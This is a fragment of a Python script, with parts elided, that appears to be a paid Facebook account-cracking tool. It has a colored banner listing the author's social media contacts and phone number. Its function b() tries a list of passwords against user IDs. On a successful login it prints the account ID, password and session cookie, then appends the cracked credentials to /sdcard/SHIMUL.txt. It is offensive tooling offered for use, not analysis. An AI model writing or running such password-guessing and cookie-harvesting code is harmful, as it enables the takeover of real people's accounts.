...
logo=(""" 
   \033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
   \033[0;91m██╗  ██╗\033[0;92m██╗  ██╗     \033[1;35m██╗  \033[1;35m██╗   ██╗\033[0;92m     ║
   \033[0;91m╚██╗██╔╝\033[0;92m██║  ██║     \033[1;35m██║  \033[1;35m██║   ██║\033[0;92m     ║
   \033[0;91m ╚███╔╝ \033[0;92m███████║     \033[1;35m██║  \033[1;35m██║   ██║\033[0;92m     ║
   \033[0;91m ██╔██╗ \033[0;92m╚════██║\033[1;35m██   ██║  \033[1;35m██║   ██║\033[0;92m     ║
   \033[0;91m██╔╝ ██╗     \033[0;92m██║╚\033[1;35m█████╔╝  \033[1;35m╚██████╔╝ \033[0;92m    ║
   \033[0;91m╚═╝  ╚═╝     \033[0;92m╚═╝ ╚════╝     ╚═════╝V 0.1\033[0;92m║                                 
   \033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝ 
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║       \33[0;41m        [ LOV3 YOU ILMA💖 ]         \033[0;92m
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR- SH4MUL ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • MD SHIMUL]║  \033[1;97m  
╠══[Telegram                   • \33[1;38mDARKCYBER420]     ║\33[1;34m   
╠══[Whatsapp                 • 01975549322 ]  ║\33[1;35m 
╠══[TOOLS                    • Paid  ]        ║ \33[1;32m   
...
def Main():
	...
	if opt in ["A","1"]:
		fuck()
	if opt in ["B","2"]:
		os.system('xdg-open https://www.facebook.com/md.shimul.705874r?mibextid=ZbWKwL');time.sleep(1)
	if opt in ["C","3"]:
		os.system('xdg-open https://www.facebook.com/md.shimul.705874r?mibextid=ZbWKwL');time.sleep(1)
		fb()
	if opt in ["0","0"]:
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mSHIMUL\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [SHIMUL] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92mCOOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/SHIMUL.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
